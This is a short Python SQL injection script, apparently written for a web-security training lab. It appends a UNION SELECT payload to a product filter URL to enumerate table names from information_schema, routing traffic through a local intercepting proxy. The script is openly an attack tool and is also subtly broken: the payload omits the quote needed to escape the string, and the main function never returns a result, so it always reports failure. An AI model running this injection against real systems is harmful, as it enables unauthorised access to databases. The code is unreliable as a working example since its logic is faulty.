import requests 
import sys
import urllib3
import re
from bs4 import BeautifulSoup
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

def perform_request(url, sqli_payload):
    path = 'filter?category=Pets'
    r = requests.get(url + path + sqli_payload, verify=False, proxies=proxies)
    return r.text

def sqli_users_table(url):
    path = 'filter?category=Pets'
    payload = '+UNION+SELECT+table_name,+null+FROM+information_schema.tables--'
    res = perform_request(url, payload)
    print(res)






if __name__== '__main__':
    try:
        url = sys.argv[1].strip()

    except IndexError:
        print(f'[-] Usage: {sys.argv[0]} <url>')
        print(f'[-] Example: {sys.argv[0]} www.example.com')
        sys.exit(-1)
    
    print('Looking for users table...')
    users_table = sqli_users_table(url)
    if users_table:
        print( f'Found the users table name: {users_table}')
    else:
        print('Did not find users table :(')